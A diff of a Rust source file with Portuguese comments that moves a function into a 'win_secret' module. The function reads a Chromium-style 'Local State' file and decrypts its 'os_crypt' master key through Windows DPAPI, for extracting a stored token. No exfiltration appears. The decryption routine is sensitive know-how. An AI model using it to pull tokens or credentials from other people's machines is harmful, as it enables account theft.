@@ -12,7 +12,7 @@
 //! Por isso a extração procura o token **por nome de campo**, sem exigir
 //! esquema: um envelope novo em volta dos mesmos campos continua funcionando.
 
-use crate::collect::win_secret::{decrypt_v10, dpapi_unprotect, strip_dpapi_prefix};
+use crate::collect::win_secret::{decrypt_v10, master_key};
 use anyhow::{anyhow, bail, Context, Result};
 use base64::Engine;
 use serde_json::Value;
@@ -84,22 +84,6 @@ pub fn tem_os_dois_arquivos(dir: &Path) -> bool {
 
 pub fn user_data_dir() -> Option<PathBuf> {
     user_data_dirs().into_iter().find(|d| tem_os_dois_arquivos(d))
-}
-
-/// Chave mestra do `os_crypt`, lida do `Local State` e desenvelopada por DPAPI.
-pub fn master_key(dir: &Path) -> Result<Zeroizing<Vec<u8>>> {
-    let caminho = dir.join("Local State");
-    let raw = std::fs::read_to_string(&caminho)
-        .with_context(|| format!("lendo {}", caminho.display()))?;
-    let json: Value = serde_json::from_str(&raw).context("`Local State` não é JSON válido")?;
-    let b64 = json
-        .pointer("/os_crypt/encrypted_key")
-        .and_then(|v| v.as_str())
-        .ok_or_else(|| anyhow!("`Local State` sem `os_crypt.encrypted_key`"))?;
-    let envelope = base64::engine::general_purpose::STANDARD
-        .decode(b64)
-        .context("`encrypted_key` não é base64")?;
-    dpapi_unprotect(strip_dpapi_prefix(&envelope)?)
 }
 
 fn normaliza(chave: &str) -> String {
